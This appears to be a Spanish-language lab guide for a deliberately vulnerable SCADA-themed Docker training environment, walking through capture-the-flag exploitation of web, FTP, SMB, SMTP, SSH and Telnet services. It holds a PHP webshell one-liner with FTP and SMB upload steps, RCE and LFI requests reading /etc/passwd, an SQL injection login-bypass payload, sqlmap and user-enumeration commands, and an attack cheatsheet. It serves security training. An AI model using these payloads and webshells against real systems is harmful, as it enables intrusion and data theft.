<div align="center">

# ⚡ Planta Energía Vulnerable Lab
### Guía de Laboratorio — Intrusión Controlada

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Level](https://img.shields.io/badge/Nivel-Intermedio-ffb300?style=for-the-badge&logo=hackthebox&logoColor=white)
![Theme](https://img.shields.io/badge/Temática-ICS%20%2F%20SCADA-a855f7?style=for-the-badge&logo=linux&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Docker-00d4ff?style=for-the-badge&logo=docker&logoColor=white)

</div>

---

> **Escenario:** Infraestructura SCADA simulada con servicios heredados deliberadamente inseguros. El objetivo es comprometer el sistema documentando cada vector de ataque sobre las superficies **FTP, SMB, Web, SSH, TELNET y SMTP**.

> [!WARNING]
> **Aviso Legal:** Uso exclusivo en laboratorio local y red aislada. No exponer este entorno a Internet. Todas las debilidades son intencionales con fines didácticos.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [📋 Ficha Técnica](#-ficha-técnica) |
| 02 | [🚀 Despliegue del Lab](#-despliegue-del-lab) |
| 03 | [🗺️ Mapa de Superficie de Ataque](#️-mapa-de-superficie-de-ataque) |
| 04 | [🔭 Enumeración Inicial](#-enumeración-inicial) |
| 05 | [🌐 Vector Web](#-vector-web) |
| 06 | [🔑 Exposición de Credenciales](#-exposición-de-credenciales) |
| 07 | [💉 SQL Injection](#-sql-injection) |
| 08 | [📁 Vector FTP](#-vector-ftp) |
| 09 | [🖧 Vector SMB](#-vector-smb) |
| 10 | [📧 Vector SMTP](#-vector-smtp) |
| 11 | [🔐 Acceso Remoto — SSH & TELNET](#-acceso-remoto--ssh--telnet) |
| 12 | [🔍 Hallazgos Técnicos](#-hallazgos-técnicos) |
| 13 | [⚡ Cheatsheet de Comandos](#-cheatsheet-de-comandos) |

---

## 📋 Ficha Técnica

| Campo | Valor |
|-------|-------|
| 🏷️ Nombre | `Planta Energía Vulnerable Lab` |
| 🖥️ Hostname interno | `ENERGIA-SCADA01` |
| 🐳 Servicio Docker | `planta-energia-vulnerable` |
| 🌐 IP interna | `172.25.0.10` |
| 🔌 Puertos expuestos | `21`, `2222`, `2323`, `2525`, `8080`, `1139`, `1445`, `2100-2130` |
| 🎯 Nivel | Intermedio |
| 📡 Temática | ICS / SCADA / Servicios Legacy |

---

## 🚀 Despliegue del Lab

**Levantar el entorno:**

```bash
cd /ruta/al/contenedor/planta-energia-vulnerable
docker compose up -d --build
docker logs -f planta-energia-vulnerable
```

**Apagar el entorno:**

```bash
docker compose down
```

---

## 🗺️ Mapa de Superficie de Ataque

| Vector | 🔴 Debilidad | 💥 Impacto |
|--------|-------------|-----------|
| 🌐 **Web** | `robots.txt`, backups, `.env`, config expuesta | Fuga de credenciales y rutas |
| 🌐 **Web** | Parámetro sin sanitizar en panel debug | **RCE** directo |
| 🌐 **Web** | Parámetro de inclusión sin validación | **LFI** — lectura arbitraria |
| 🌐 **Web** | Panel de login con interpolación directa | **SQL Injection** |
| 📁 **FTP** | Acceso anónimo + upload + sincronización automática | Webshell vía FTP |
| 🖧 **SMB** | Guest write en share accesible | Webshell directa |
| 📧 **SMTP** | `VRFY`, `EXPN`, open relay habilitados | Enumeración de cuentas |
| 🔐 **SSH** | `PermitRootLogin yes` + passwords débiles | Shell remota privilegiada |
| 📺 **TELNET** | Credenciales en texto claro | Shell remota legacy |

---

## 🔭 Enumeración Inicial

![Tool](https://img.shields.io/badge/Tool-Nmap-ff3c6e?style=flat-square&logo=linux&logoColor=white)

### `[01]` Escaneo de Puertos y Servicios

Identificar puertos abiertos y versiones de servicio:

```bash
nmap -sC -sV -Pn -p- <TARGET_IP>
```

**Hallazgos esperados:**

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| `21/tcp` | FTP | vsftpd — banner industrial |
| `2222/tcp` | SSH | Autenticación por password habilitada |
| `2323/tcp` | TELNET | Acceso en texto claro |
| `2525/tcp` | SMTP | `VRFY` y `EXPN` habilitados |
| `8080/tcp` | HTTP | Apache + PHP con directory listing |
| `1139/tcp` | SMB | Guest/null session, SMB legado |
| `1445/tcp` | SMB | Guest/null session, SMB legado |

### `[02]` Fingerprint Rápido

```bash
curl -i http://<TARGET_IP>:<PORT>/
curl -i http://<TARGET_IP>:<PORT>/robots.txt
printf 'EHLO test\r\nQUIT\r\n' | nc <TARGET_IP> <SMTP_PORT>
```

---

## 🌐 Vector Web

![Tool](https://img.shields.io/badge/Tool-curl%20%7C%20ffuf%20%7C%20gobuster-00d4ff?style=flat-square)

### `[01]` Reconocimiento Web — robots.txt

Primer archivo a revisar en cualquier objetivo web:

```bash
curl http://<TARGET_IP>:<PORT>/robots.txt
```

> [!TIP]
> `robots.txt` puede revelar directorios sensibles que el administrador intentó ocultar de los buscadores. Investiga cada ruta listada.

**Rutas de interés a explorar:**

- Directorios con restricción `Disallow` — pueden contener información sensible
- Archivos de configuración expuestos (`.env`, `.bak`, `.php`)
- Paneles de administración o debug
- Directorios de backup con directory listing activo

### `[02]` Enumeración de Directorios

```bash
# FFUF
ffuf -u http://<TARGET_IP>:<PORT>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Gobuster
gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/common.txt
```

### `[03]` RCE — Panel de Debug

> [!IMPORTANT]
> Algunos paneles de debug exponen parámetros GET que pasan directamente a `system()` **sin ninguna validación.** Identifica el endpoint vulnerable y el nombre del parámetro.

```bash
# Verificar ejecución de comandos
curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=id"

# Ejemplo de lectura de archivo
curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=cat%20<ruta-objetivo>"
```

🚩 **Objetivo:** encontrar y leer el archivo de flag en el sistema mediante RCE.

### `[04]` LFI — Local File Inclusion

```bash
# Verificar lectura de archivos del sistema
curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=/etc/passwd"

# Leer archivos de configuración internos
curl "http://<TARGET_IP>:<PORT>/<endpoint-vulnerable>?<param>=/ruta/al/archivo"
```

**Impacto:** lectura arbitraria de archivos, recuperación de secretos, apoyo a escalada y pivote.

### `[05]` Directorios Ocultos y Archivos Expuestos

```bash
# Explorar directorios descubiertos
curl http://<TARGET_IP>:<PORT>/<directorio-oculto>/

# Leer archivos dentro de directorios con listing activo
curl http://<TARGET_IP>:<PORT>/<directorio>/
```

🚩 **Objetivo:** encontrar flags ocultas en directorios y archivos expuestos por el servidor.

---

## 🔑 Exposición de Credenciales

![Risk](https://img.shields.io/badge/Severidad-Crítica-ff3c6e?style=flat-square)

Múltiples archivos accesibles sin autenticación exponen credenciales del sistema:

```bash
# Archivos comunes de configuración expuestos
curl http://<TARGET_IP>:<PORT>/.env
curl http://<TARGET_IP>:<PORT>/includes/config.php
curl http://<TARGET_IP>:<PORT>/backup/<archivo>.bak
curl http://<TARGET_IP>:<PORT>/backup/<archivo>.txt
```

> [!IMPORTANT]
> Las credenciales que encuentres pueden reutilizarse en otros servicios: web, SSH, TELNET, FTP, BD. Documenta todo lo que encuentres y prueba en cada superficie.

---

## 💉 SQL Injection

![Tool](https://img.shields.io/badge/Tool-curl%20%7C%20sqlmap-ffb300?style=flat-square)

El panel de administración web utiliza interpolación directa de parámetros en la consulta SQL:

```sql
SELECT * FROM tabla WHERE username = '$u' AND password = '$p'
```

### `[01]` Payload de Bypass de Autenticación

```text
username: ' OR '1'='1' -- -
password: cualquier_valor
```

### `[02]` Explotación con curl

```bash
curl -s -X POST http://<TARGET_IP>:<PORT>/<panel-admin>/ \
  -d "username=<payload-sqli>&password=x"
```

### `[03]` Automatización con sqlmap

```bash
sqlmap -u http://<TARGET_IP>:<PORT>/<panel-admin>/ \
  --data="username=admin&password=test" \
  -p username --batch --level 3 --risk 2
```

🚩 **Objetivo:** autenticarse en el panel SCADA mediante SQL Injection y obtener la flag.

---

## 📁 Vector FTP

![Tool](https://img.shields.io/badge/Tool-ftp%20%7C%20curl%20%7C%20lftp-00ff88?style=flat-square)

El servicio FTP expone las siguientes capacidades:
- ✅ Acceso anónimo — sin credenciales
- ✅ Escritura en directorio de subida
- ✅ Sincronización automática hacia raíz web

### `[01]` Exploración Anónima

```bash
# Listar contenido del FTP
ftp <TARGET_IP>
# usuario: anonymous / sin password

# Con curl
curl ftp://anonymous:@<TARGET_IP>/
curl ftp://anonymous:@<TARGET_IP>/<directorio>/
```

🚩 **Objetivo:** localizar y leer el archivo de flag expuesto en el FTP.

### `[02]` Webshell vía FTP

```bash
# Crear webshell local
printf '%s\n' '<?php system($_GET["cmd"] ?? "id"); ?>' > shell.php

# Subir al directorio de upload del FTP
curl -T shell.php "ftp://anonymous:@<TARGET_IP>/<directorio-upload>/shell.php"

# Esperar sincronización y ejecutar vía web
sleep 3
curl "http://<TARGET_IP>:<PORT>/<ruta-web-sincronizada>/shell.php?cmd=id"
```

> [!NOTE]
> Investiga si existe un proceso automático que sincronice archivos del FTP hacia el servidor web. Eso convierte el upload en RCE.

---

## 🖧 Vector SMB

![Tool](https://img.shields.io/badge/Tool-smbclient%20%7C%20enum4linux-ff6b00?style=flat-square)

### `[01]` Listar Shares

```bash
smbclient -N -p <PUERTO_SMB> -L //<TARGET_IP>
enum4linux -a <TARGET_IP>
```

**Tipos de shares a investigar:**

| Acceso | Objetivo |
|--------|---------|
| ✅ Guest write | Subida de webshell |
| 👁️ Guest read | Lectura de backups y credenciales |
| 🔒 Autenticado | Acceso con credenciales encontradas |

### `[02]` Webshell vía SMB

```bash
# Crear webshell
printf '%s\n' '<?php system($_GET["cmd"] ?? "id"); ?>' > smb.php

# Subir a share con escritura
smbclient -N -p <PUERTO_SMB> //<TARGET_IP>/<share-con-escritura> -c "put smb.php smb.php"

# Ejecutar vía web si el share apunta al webroot
curl "http://<TARGET_IP>:<PORT>/<ruta-share-en-web>/smb.php?cmd=id"
```

### `[03]` Lectura de Shares con Backups

```bash
smbclient -N -p <PUERTO_SMB> //<TARGET_IP>/<share-backup> -c "recurse; ls"
smbclient -N -p <PUERTO_SMB> //<TARGET_IP>/<share-backup> -c "get <archivo>"
```

🚩 **Objetivo:** encontrar la flag expuesta en los shares SMB y lograr ejecución de código vía webshell.

---

## 📧 Vector SMTP

![Tool](https://img.shields.io/badge/Tool-nc%20%7C%20swaks%20%7C%20smtp--user--enum-ffb300?style=flat-square)

### `[01]` Enumeración de Usuarios — VRFY / EXPN

```bash
# Verificar si VRFY y EXPN están habilitados
printf 'EHLO auditor.local\r\nVRFY <usuario>\r\nEXPN <alias>\r\nQUIT\r\n' | nc <TARGET_IP> <SMTP_PORT>
```

### `[02]` Enumeración Masiva con smtp-user-enum

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt \
  -t <TARGET_IP> -p <SMTP_PORT>
```

### `[03]` Prueba con swaks

```bash
swaks --server <TARGET_IP>:<SMTP_PORT> --ehlo auditor.local --quit-after RCPT \
  --to <usuario>@localhost
```

**Valor ofensivo:**
- 📋 Enumeración de usuarios válidos del sistema para password spraying
- 📬 Validación de aliases y grupos internos
- 🔗 Apoyo al movimiento lateral con credenciales encontradas

🚩 **Objetivo:** enumerar usuarios del sistema vía SMTP y encontrar la flag asociada al servicio.

---

## 🔐 Acceso Remoto — SSH & TELNET

### `[01]` SSH — Credenciales Débiles

![Tool](https://img.shields.io/badge/Tool-SSH-5865f2?style=flat-square)

```bash
# Intentar acceso con usuarios y contraseñas encontradas
ssh -p <PUERTO_SSH> <usuario>@<TARGET_IP>
```

```bash
# Una vez dentro, buscar flags
find / -name "*.txt" 2>/dev/null | grep -v proc
```

> [!IMPORTANT]
> Configuración vulnerable detectada: `PermitRootLogin yes` + `PasswordAuthentication yes`. Usa las credenciales recolectadas en fases anteriores.

🚩 **Objetivo:** obtener shell remota y encontrar la flag en el sistema de archivos.

### `[02]` TELNET — Protocolo Legacy en Texto Claro

![Tool](https://img.shields.io/badge/Tool-Telnet-ff3c6e?style=flat-square)

```bash
telnet <TARGET_IP> <TELNET_PORT>
# Usar credenciales encontradas durante la enumeración
```

```bash
# Una vez autenticado
find /home -name "*.txt" 2>/dev/null
```

> [!WARNING]
> TELNET transmite todo en **texto claro**, incluyendo credenciales. Capturable con Wireshark o tcpdump en la misma red.

🚩 **Objetivo:** autenticarse por TELNET con credenciales válidas y recuperar la flag.

---

## 🔍 Hallazgos Técnicos

| ID | Hallazgo | Severidad |
|----|----------|-----------|
| `PLE-01` | Credenciales expuestas en archivos públicos (`.env`, backups, configs) | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
| `PLE-02` | RCE directa vía parámetro GET sin sanitizar — `system()` | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
| `PLE-03` | LFI vía `include()` sin validación de ruta | ![](https://img.shields.io/badge/-Crítica-ff3c6e?style=flat-square) |
| `PLE-04` | SQL Injection en formulario de login admin | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-05` | FTP anónimo con upload y sincronización automática al webroot | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-06` | SMB guest write y null session en shares sensibles | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-07` | SSH con `PermitRootLogin yes` y contraseñas débiles | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-08` | TELNET habilitado — protocolo legacy en texto claro | ![](https://img.shields.io/badge/-Alta-ff6b00?style=flat-square) |
| `PLE-09` | SMTP con `VRFY` / `EXPN` habilitados — enumeración de usuarios | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |
| `PLE-10` | Banners, versiones y directory listing expuestos | ![](https://img.shields.io/badge/-Media-ffb300?style=flat-square) |

---

## ⚡ Cheatsheet de Comandos

```bash
# ── RECON ─────────────────────────────────────────────────────────────
nmap -sC -sV -Pn -p- <TARGET_IP>
nmap -sC -sV -Pn -p<PORT1>,<PORT2>,<PORT3> <TARGET_IP>

# ── WEB ───────────────────────────────────────────────────────────────
curl http://<TARGET_IP>:<PORT>/robots.txt
curl http://<TARGET_IP>:<PORT>/<archivo-config>
curl "http://<TARGET_IP>:<PORT>/<endpoint>?<param>=id"
curl "http://<TARGET_IP>:<PORT>/<endpoint>?<param>=/etc/passwd"
ffuf -u http://<TARGET_IP>:<PORT>/FUZZ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirb/common.txt

# ── SQLi ──────────────────────────────────────────────────────────────
curl -s -X POST http://<TARGET_IP>:<PORT>/<panel>/ \
  -d "username=<payload>&password=x"
sqlmap -u http://<TARGET_IP>:<PORT>/<panel>/ \
  --data="username=admin&password=test" -p username --batch

# ── FTP ───────────────────────────────────────────────────────────────
ftp <TARGET_IP>                                      # usuario: anonymous
curl ftp://anonymous:@<TARGET_IP>/
curl -T shell.php "ftp://anonymous:@<TARGET_IP>/<upload-dir>/shell.php"

# ── SMB ───────────────────────────────────────────────────────────────
smbclient -N -p <PORT> -L //<TARGET_IP>
enum4linux -a <TARGET_IP>
smbclient -N -p <PORT> //<TARGET_IP>/<SHARE> -c "put shell.php shell.php"
smbclient -N -p <PORT> //<TARGET_IP>/<SHARE> -c "recurse; ls"

# ── SMTP ──────────────────────────────────────────────────────────────
printf 'EHLO test\r\nVRFY <usuario>\r\nEXPN <alias>\r\nQUIT\r\n' | nc <TARGET_IP> <PORT>
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <TARGET_IP> -p <PORT>

# ── ACCESO REMOTO ─────────────────────────────────────────────────────
ssh -p <PUERTO_SSH> <usuario>@<TARGET_IP>
telnet <TARGET_IP> <PUERTO_TELNET>
```

---

<div align="center">

**`Planta Energía Vulnerable Lab`** — practica recon multivector, explotación web manual, abuso de servicios legacy y explotación encadenada hacia shell.

![](https://img.shields.io/badge/FTP-Webshell-00ff88?style=flat-square)
![](https://img.shields.io/badge/SMB-Null%20Session-ff6b00?style=flat-square)
![](https://img.shields.io/badge/Web-RCE%20%7C%20LFI%20%7C%20SQLi-ff3c6e?style=flat-square)
![](https://img.shields.io/badge/SSH-Root%20Shell-a855f7?style=flat-square)
![](https://img.shields.io/badge/SMTP-User%20Enum-ffb300?style=flat-square)

</div>
